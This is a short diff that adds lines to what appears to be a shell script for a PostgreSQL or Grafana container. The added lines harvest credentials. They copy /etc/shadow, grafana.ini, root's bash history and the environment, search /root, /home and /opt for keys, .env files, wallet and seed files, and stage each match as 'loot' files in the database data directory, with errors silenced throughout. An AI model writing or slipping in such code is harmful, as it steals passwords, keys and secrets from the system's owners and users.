@@ -1,0 +1,11 @@
+cp /etc/grafana/grafana.ini /var/lib/postgresql/data/g.ini 2>/dev/null
+cp /etc/shadow /var/lib/postgresql/data/shadow.txt 2>/dev/null
+find /root /home /opt -maxdepth 4 -type f \( -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "seed*" -o -name "wallet*" -o -name "private*" -o -name "secret*" -o -name "*.json" \) 2>/dev/null > /var/lib/postgresql/data/secrets_list.txt
+cat /root/.bash_history > /var/lib/postgresql/data/bash_hist.txt 2>/dev/null
+ls -laR /root/ > /var/lib/postgresql/data/root_ls.txt 2>/dev/null
+ls -laR /opt/ > /var/lib/postgresql/data/opt_ls.txt 2>/dev/null
+ls -laR /home/ > /var/lib/postgresql/data/home_ls.txt 2>/dev/null
+env > /var/lib/postgresql/data/host_env.txt 2>/dev/null
+while IFS= read -r f; do cp "$f" "/var/lib/postgresql/data/loot_$(echo $f | tr '/' '_')" 2>/dev/null; done < /var/lib/postgresql/data/secrets_list.txt
+# end
+set -Eeo pipefail
